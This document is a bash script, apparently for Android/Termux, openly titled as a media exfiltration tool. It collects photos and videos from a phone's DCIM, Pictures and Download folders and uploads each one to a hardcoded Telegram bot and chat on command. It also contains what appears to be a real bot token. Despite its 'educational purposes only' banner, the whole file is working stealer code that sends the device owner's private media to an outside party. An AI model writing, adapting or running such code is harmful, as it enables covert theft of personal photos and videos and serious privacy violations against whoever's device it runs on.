#!/bin/bash
# tool.sh - Final Version with Media Exfiltration

#-------------------
#   Color Settings
#-------------------
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

#-------------------
#   ASCII Art
#-------------------
display_logo() {
    clear
    echo -e "${RED}"
    echo '
██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
███████║█████╗  ██╔████╔██║███████║   ███████║██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝
    '
    echo -e "${RESET}"
    echo -e "${GREEN}[+] Tool by YourName${RESET}"
    echo -e "${YELLOW}[!] For educational purposes only${RESET}\n"
}

#-------------------
#   Configuration
#-------------------
BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
CHAT_ID="5967116314"
LOG_DIR="/sdcard/tool_logs"
MEDIA_DIRS=("/sdcard/DCIM" "/sdcard/Pictures" "/sdcard/Download")
SESSIONS_DIR="$LOG_DIR/sessions"
USER_LIST="$LOG_DIR/users.txt"

mkdir -p "$LOG_DIR" "$SESSIONS_DIR"

#-------------------
#   Telegram API
#-------------------
send_message() {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$1" >/dev/null
}

send_media() {
    local file="$1"
    local type=$(file --mime-type -b "$file")

    if [[ $type == image/* ]]; then
        curl -s -F chat_id="$CHAT_ID" -F photo=@"$file" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" >/dev/null
    elif [[ $type == video/* ]]; then
        curl -s -F chat_id="$CHAT_ID" -F video=@"$file" "https://api.telegram.org/bot$BOT_TOKEN/sendVideo" >/dev/null
    else
        send_message "⚠️ Unsupported file type: $type"
    fi
}

#-------------------
#   Media Exfiltration
#-------------------
exfiltrate_media() {
    send_message "🔍 Starting media exfiltration..."
    local file_count=0

    for dir in "${MEDIA_DIRS[@]}"; do
        if [ -d "$dir" ]; then
            find "$dir" -type f \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" -o -name "*.mp4" \) | while read file; do
                send_media "$file"
                ((file_count++))
            done
        fi
    done

    send_message "✅ Completed! Sent $file_count files"
}

#-------------------
#   Command Handler
#-------------------
handle_command() {
    case $1 in
        grab_media)
            exfiltrate_media
            ;;
        *)
            send_message "❌ Invalid command"
            ;;
    esac
}

#-------------------
#   Main Execution
#-------------------
display_logo
send_message "Intialized successfully. Type /grab_media to exfiltrate files"

while true; do
    local update=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates")
    local message=$(echo "$update" | grep -oP '(?<=text":")[^"]+')

    if [ ! -z "$message" ]; then
        handle_command "$message"
    fi

    sleep 5
done
